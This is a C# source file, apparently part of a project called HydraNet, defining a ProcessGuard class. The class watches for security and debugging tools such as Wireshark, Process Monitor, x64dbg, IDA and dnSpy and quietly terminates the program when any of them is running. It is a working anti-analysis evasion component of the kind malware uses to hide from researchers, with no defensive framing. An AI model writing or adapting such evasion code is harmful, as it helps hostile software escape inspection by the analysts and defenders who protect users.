namespace HydraNet.Evasion;

using System.Diagnostics;

public sealed class ProcessGuard
{
    private readonly HashSet<string> _blockedProcesses;
    private Timer? _watchTimer;

    public bool IsGuarding { get; private set; }

    public ProcessGuard(IEnumerable<string> blockedProcessNames)
    {
        _blockedProcesses = new HashSet<string>(blockedProcessNames, StringComparer.OrdinalIgnoreCase);
    }

    public void Start(TimeSpan checkInterval)
    {
        IsGuarding = true;
        _watchTimer = new Timer(CheckProcesses, null, TimeSpan.Zero, checkInterval);
    }

    public void Stop()
    {
        IsGuarding = false;
        _watchTimer?.Dispose();
        _watchTimer = null;
    }

    public bool IsAnalysisToolRunning()
    {
        var processes = Process.GetProcesses();
        return processes.Any(p => _blockedProcesses.Contains(p.ProcessName));
    }

    private void CheckProcesses(object? state)
    {
        if (IsAnalysisToolRunning())
        {
            OnThreatDetected();
        }
    }

    private static void OnThreatDetected()
    {
        Environment.Exit(0);
    }

    public static ProcessGuard CreateDefault()
    {
        return new ProcessGuard([
            "wireshark", "fiddler", "tcpview", "procmon",
            "processhacker", "x64dbg", "x32dbg", "ida64",
            "ollydbg", "dnSpy", "pestudio"
        ]);
    }
}
